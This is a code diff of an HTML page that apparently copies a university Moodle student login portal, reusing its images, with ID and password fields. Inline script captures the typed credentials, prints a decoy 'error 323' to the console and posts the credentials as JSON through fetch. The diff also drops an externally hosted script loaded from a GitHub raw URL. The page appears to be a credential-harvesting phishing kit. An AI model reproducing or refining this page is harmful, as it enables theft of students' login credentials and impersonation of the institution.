@@ -1,13 +1,11 @@
-
-
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Document</title>
     <style>
-<script>
-	    
+
 
     body {
         margin:0;
@@ -86,8 +84,7 @@ h2 {
 #center2 {
 	width: 781px;
 	margin: 0 auto;
-	background: url(`http://moodle.smuc.edu.et/students/image/bg.jpg`) repeat-y;
-	height:100px;
+	background: url(image/bg.jpg) repeat-y;
 	
 }
 
@@ -123,8 +120,8 @@ h2 {
 
 <script>
   console.log("error 323");
-var name = 'amh';
-var onClick = () => {
+  var name = 'amh';
+var onclick = () => {
 	event.preventDefault();
     var id = document.getElementById('ID').value
     var pass = document.getElementById('PASS').value
@@ -141,12 +138,19 @@ var onClick = () => {
         "Content-type": "application/json; charset=UTF-8"
     }
 })
+ 
+// Converting to JSON
 .then(response => response.json())
+ 
+// Displaying results to console
 .then(json => console.log(json));
 }
 </script>
 </head>
   <body style="margin: 0px !important;background-color: white;" data-new-gr-c-s-check-loaded="8.901.0" data-gr-ext-installed="" background="http://moodle.smuc.edu.et/students/image/bg.jpg">
+
+  
+ 
 <br>
 <div id="center2">
 <table width="100%" height="100%" cellspacing="0" cellpadding="1">
@@ -281,16 +285,16 @@ MM_reloadPage(true);
 <table>
   <tbody><tr>
    <td valign="top"><br><br>
-     <form name="index" onsubmit="onClick()">
+     <form name="index" onsubmit=`onclick()`>
        <input type="hidden" name="refresh" value="96222">	
        <table cellspacing="0" cellpadding="1">
           <tbody><tr> 
             <td width="34%" align="left"><font size="2" face="Times New Roman, Times, serif" color="#004488"><strong>Login Id:</strong></font></td>
-            <td align="left"><input type="text" name="ID" size="20" id="ID"></td>
+            <td align="left"><input type="text" name="ID" id="ID" size="20"></td>
           </tr>
           <tr> 
             <td width="34%" align="left"><font size="2" face="Times New Roman, Times, serif" color="#004488"><strong>Password:</strong></font></td>
-            <td align="left"><input type="password" name="PASS" size="20" id="PASS" ></td>
+            <td align="left"><input type="password" id="PASS" name="PASS" size="20"></td>
           </tr>
        </tbody></table>
    
@@ -302,7 +306,7 @@ MM_reloadPage(true);
           <td><div><a href="index.php"><font color="#627EB7"><u></u></font></a></div></td>
         </tr>
        </tbody></table>
-
+       
      </form>
      
     </td>
@@ -368,7 +372,6 @@ MM_reloadPage(true);
 
 
 </div>
-<script src="https://raw.githubusercontent.com/S-H-E1/ST/main/js.js" ></script>
+
 </body>
-
-
+</html>
